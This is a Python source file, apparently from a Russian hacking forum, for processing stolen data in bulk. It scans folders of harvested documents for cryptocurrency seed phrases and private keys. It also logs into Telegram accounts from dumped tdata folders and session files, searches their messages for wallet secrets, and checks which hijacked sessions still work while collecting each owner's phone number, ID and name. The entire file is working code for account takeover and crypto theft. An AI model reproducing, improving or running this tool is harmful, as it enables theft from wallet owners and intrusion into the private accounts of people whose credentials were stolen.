# -*- coding: utf-8 -*-
# @author: zelenka.guru/zcxw

from app import (
    fix_path,
    read_file,
    update_progress,
    find_files,
    progress_create,
    chunks,
    checkValidTelegramClient,
    pinfo,
    perror,
)
from app.parsers.text import parsing_crypto_from_srting
from app.parsers.telegram import check_user_messages_is_crypto
from app.tdata import telethonsFromTdata
from app.session import telethonFromSession


import os
from asyncio import Semaphore
import asyncio
import async_timeout
import fitz
import ezodf
import docx2txt


class FilesParser:
    def __init__(self, config):
        self.config: dict = config["ПАРСИНГ_ФАЙЛОВ"]

    async def main_task(self, file_path: str, sem: Semaphore, progress, task):
        async with sem:
            try:
                async with async_timeout.timeout(self.config["макс_время_работы_потока"]):
                    file_path = fix_path(file_path)
                    if os.path.basename(file_path).endswith(".pdf"):
                        try:
                            with fitz.open(file_path) as doc:
                                file_data = ""
                                for page in doc:
                                    file_data += page.get_text()
                        except:
                            file_data = await read_file(file_path)
                    elif os.path.basename(file_path).endswith(".odt"):
                        try:
                            odt = ezodf.opendoc(file_path)
                            file_data = ""
                            for i in odt.body:
                                if i.text is not None:
                                    file_data += i.text.lower() + "\n"
                        except:
                            file_data = await read_file(file_path)

                    elif os.path.basename(file_path).endswith(".docx"):
                        try:
                            file_data = docx2txt.process(file_path)
                        except:
                            file_data = await read_file(file_path)
                    else:
                        file_data = await read_file(file_path)
                    result = await parsing_crypto_from_srting(file_data, self.config)
                    if result:
                        seeds, wifs, hexs = result
                        seeds = map(lambda x: [x, file_path], seeds)
                        self.seeds.extend(list(seeds))
                        self.wifs.extend(wifs)
                        self.hexs.extend(hexs)
            except:
                pass
            finally:
                update_progress(task, progress)

    async def __call__(self):
        self.files_path = fix_path(self.config["папка_данных"])
        self.seeds = []
        self.wifs = []
        self.hexs = []
        white_list_files = self.config["белый_список_файлов"]
        if white_list_files == []:
            white_list_files = None
        self.files = find_files(
            self.files_path, white_list_files, True, black_list_files=self.config["черный_список_файлов"]
        )
        sem = Semaphore(self.config["макс_потоков"])
        progress, task = progress_create(len(self.files), "[#ffffff]PROGRESS:[/#ffffff]")

        with progress:
            chinkis = chunks(self.files, 10_000)
            for chink in chinkis:
                await asyncio.gather(
                    *(self.main_task(fix_path(self.files_path, file), sem, progress, task) for file in chink),
                    return_exceptions=False,
                )
        return True


class TdataParsing:
    def __init__(self, config):
        self.config: dict = config["ПАРСИНГ_ТЕЛЕГРАММ"]

    async def main_task(self, tdata_path: str, sem: Semaphore, progress, task):
        async with sem:
            try:
                async with async_timeout.timeout(self.config["макс_время_работы_потока"]):
                    clients = await telethonsFromTdata(fix_path(tdata_path))
                    for client in clients:
                        try:
                            await client.connect()
                            result = await check_user_messages_is_crypto(client, self.config)
                            if result:
                                seeds, wifs, hexs = result
                                for seed in seeds:
                                    self.seeds.append([seed, tdata_path])
                                for wif in wifs:
                                    self.wifs.append(wif)
                                for hex in hexs:
                                    self.hexs.append(hex)
                        except:
                            pass
                        try:
                            await client.disconnect()
                        except:
                            pass
            except:
                pass
            finally:
                update_progress(task, progress)

    async def __call__(self):
        self.tdatas_path = fix_path(self.config["папка_данных"])
        self.seeds = []
        self.wifs = []
        self.hexs = []
        self.tdatas = list(map(os.path.dirname, find_files(self.tdatas_path, ["key_datas"], True)))
        sem = Semaphore(self.config["макс_потоков"])
        progress, task = progress_create(len(self.tdatas), "[#ffffff]PROGRESS:[/#ffffff]")
        with progress:
            chinkis = chunks(self.tdatas, 10_000)
            for chink in chinkis:
                await asyncio.gather(
                    *(
                        self.main_task(fix_path(self.tdatas_path, tdata), sem, progress, task)
                        for tdata in self.tdatas
                    ),
                    return_exceptions=False,
                )
        return True


class SessionsParsing:
    def __init__(self, config):
        self.config: dict = config["ПАРСИНГ_ТЕЛЕГРАММ"]

    async def main_task(self, session_path: str, sem: Semaphore, progress, task):
        async with sem:
            try:
                async with async_timeout.timeout(self.config["макс_время_работы_потока"]):
                    client = await telethonFromSession(fix_path(session_path))
                    await client.connect()
                    try:
                        result = await check_user_messages_is_crypto(client, self.config)
                        if result:
                            seeds, wifs, hexs = result
                            for seed in seeds:
                                self.seeds.append([seed, session_path])
                            for wif in wifs:
                                self.wifs.append(wif)
                            for hex in hexs:
                                self.hexs.append(hex)
                    except Exception:
                        pass
                    try:
                        await client.disconnect()
                    except:
                        pass
            except:
                pass
            finally:
                update_progress(task, progress)

    async def __call__(self):
        self.sessions_path = fix_path(self.config["папка_данных"])
        self.seeds = []
        self.wifs = []
        self.hexs = []
        self.sessions = find_files(self.sessions_path, ["*.session"], True)
        sem = Semaphore(self.config["макс_потоков"])
        progress, task = progress_create(len(self.sessions), "[#ffffff]PROGRESS:[/#ffffff]")
        with progress:
            chinkis = chunks(self.sessions, 10_000)
            for chink in chinkis:
                await asyncio.gather(
                    *(
                        self.main_task(fix_path(self.sessions_path, session), sem, progress, task)
                        for session in self.sessions
                    ),
                    return_exceptions=False,
                )
        return True


class TdataChecker:
    def __init__(self, config):
        self.config: dict = config["ЧЕК_ТЕЛЕГРАММ"]

    async def main_task(self, tdata_path: str, sem: Semaphore, progress, task):
        async with sem:
            try:
                async with async_timeout.timeout(self.config["макс_время_работы_потока"]):
                    clients = await telethonsFromTdata(fix_path(tdata_path)) or []
                    for client in clients:
                        try:
                            await client.connect()
                            me = await checkValidTelegramClient(client)
                            if me:
                                if self.config["сохранять_данные_телеграмм"]:
                                    format_data = {
                                        "path": tdata_path,
                                        "username": me.username,
                                        "phone": me.phone,
                                        "id": me.id,
                                        "first_name": me.first_name,
                                        "last_name": me.last_name,
                                        "deleted": me.deleted,
                                        "lang_code": me.lang_code,
                                        "premium": me.premium,
                                        "scam": me.scam,
                                        "verified": me.verified,
                                    }
                                    if self.config["заменять_когда_нет_ника"] and me.username is None:
                                        username = self.config["заменять_когда_нет_ника"]
                                        while True:
                                            try:
                                                username = username.format(**format_data)
                                                break
                                            except Exception as e:
                                                format_data[e.args[0]] = "параметр_не_найден"
                                        username = self.config["формат_данных_телеграмм"]
                                        format_data["username"] = username
                                    while True:
                                        try:
                                            format_data_text = self.config["формат_данных_телеграмм"].format(
                                                **format_data
                                            )
                                            break
                                        except Exception as e:
                                            format_data[e.args[0]] = "параметр_не_найден"
                                    format_data_text = format_data_text.format(**format_data)
                                else:
                                    format_data_text = False
                                pinfo(f"Тдата прошла проверку на валид: {tdata_path}")
                                self.valid_tdatas.append([tdata_path, format_data_text])
                        except Exception as e:
                            perror(f"Тдата {tdata_path} не прошла проверку из за ошибки: {e}")
                        try:
                            await client.disconnect()
                        except:
                            pass
            except Exception as e:
                perror(f"Тдата {tdata_path} не прошла проверку из за ошибки: {e}")
            except:
                perror(f"Тдата {tdata_path} не прошла проверку из за неизвестной ошибки")
            finally:
                update_progress(task, progress)

    async def __call__(self):
        self.tdatas_path = fix_path(self.config["папка_данных"])
        self.valid_tdatas = []
        self.tdatas = list(map(os.path.dirname, find_files(self.tdatas_path, ["key_datas"], True)))
        sem = Semaphore(self.config["макс_потоков"])
        progress, task = progress_create(len(self.tdatas), "[#ffffff]PROGRESS:[/#ffffff]")
        with progress:
            chinkis = chunks(self.tdatas, 10_000)
            for chink in chinkis:
                await asyncio.gather(
                    *(
                        self.main_task(fix_path(self.tdatas_path, tdata), sem, progress, task)
                        for tdata in self.tdatas
                    ),
                    return_exceptions=False,
                )
        return True


class SessionsChecker:
    def __init__(self, config):
        self.config: dict = config["ЧЕК_ТЕЛЕГРАММ"]

    async def main_task(self, session_path: str, sem: Semaphore, progress, task):
        async with sem:
            try:
                async with async_timeout.timeout(self.config["макс_время_работы_потока"]):
                    client = await telethonFromSession(fix_path(session_path)) or []
                    await client.connect()
                    try:
                        me = await checkValidTelegramClient(client)
                        if me:
                            if self.config["сохранять_данные_телеграмм"]:
                                format_data = {
                                    "path": session_path,
                                    "username": me.username,
                                    "phone": me.phone,
                                    "id": me.id,
                                    "first_name": me.first_name,
                                    "last_name": me.last_name,
                                    "deleted": me.deleted,
                                    "lang_code": me.lang_code,
                                    "premium": me.premium,
                                    "scam": me.scam,
                                    "verified": me.verified,
                                }
                                if self.config["заменять_когда_нет_ника"] and me.username is None:
                                    username = self.config["заменять_когда_нет_ника"]
                                    while True:
                                        try:
                                            username = username.format(**format_data)
                                            break
                                        except Exception as e:
                                            format_data[e.args[0]] = "параметр_не_найден"
                                    username = self.config["формат_данных_телеграмм"]
                                    format_data["username"] = username
                                while True:
                                    try:
                                        format_data_text = self.config["формат_данных_телеграмм"].format(
                                            **format_data
                                        )
                                        break
                                    except Exception as e:
                                        format_data[e.args[0]] = "параметр_не_найден"
                                format_data_text = format_data_text.format(**format_data)
                            else:
                                format_data_text = False
                            pinfo(f"Сессия прошла проверку на валид: {session_path}")
                            self.valid_sessions.append([session_path, format_data_text])
                    except Exception as e:
                        perror(f"Сессия {session_path} не прошла проверку из за ошибки: {e}")
                    try:
                        await client.disconnect()
                    except:
                        pass
            except Exception as e:
                perror(f"Сессия {session_path} не прошла проверку из за ошибки: {e}")
            except:
                perror(f"Сессия {session_path} не прошла проверку из за неизвестной ошибки")
            finally:
                update_progress(task, progress)

    async def __call__(self):
        self.sessions_path = fix_path(self.config["папка_данных"])
        self.valid_sessions = []
        self.sessions = find_files(self.sessions_path, ["*.session"], True)
        sem = Semaphore(self.config["макс_потоков"])
        progress, task = progress_create(len(self.sessions), "[#ffffff]PROGRESS:[/#ffffff]")
        with progress:
            chinkis = chunks(self.sessions, 10_000)
            for chink in chinkis:
                await asyncio.gather(
                    *(
                        self.main_task(fix_path(self.sessions_path, session), sem, progress, task)
                        for session in self.sessions
                    ),
                    return_exceptions=False,
                )
        return True
